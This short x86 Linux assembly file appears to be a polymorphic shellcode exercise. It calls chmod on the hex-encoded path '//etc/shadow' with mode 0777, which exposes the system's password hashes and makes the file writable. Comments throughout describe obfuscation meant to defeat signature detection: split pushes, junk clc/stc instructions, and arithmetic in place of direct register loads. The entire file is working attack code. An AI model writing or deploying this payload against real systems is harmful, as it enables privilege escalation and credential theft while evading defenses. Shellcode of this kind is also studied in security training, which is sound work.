global _start			

section .text
_start:

	;xor eax, eax

	xor esi, esi            ; zero out ESI
	xchg eax, esi           ; exchange the register values, making EAX contain 0

	push eax

	clc                      ; add an instruction that makes no sense and clears the carry flag

	;push dword 0x776f6461

	push WORD 0x776f        ; split the above push DWORD instruction into 
	push WORD 0x6461        ; two separate push WORD instructions

	;push dword 0x68732f63

	push WORD 0x6873        ; split the above push DWORD instruction into 
	push WORD 0x2f63        ; two separate push WORD instructions

	stc                     ; add an instruction that makes no sense and sets the carry flag

	push dword 0x74652f2f
	mov ebx, esp

	;push word 0x1ff
	;pop ecx

	xor ecx, ecx            ; zero out ECX
	add cx, 0x1ff           ; add 0x1ff to CX

	;mov al, 0xf
	add al, 30              ; add 30 to AL
	sub al, 15              ; subtract 15 from AL

	int 0x80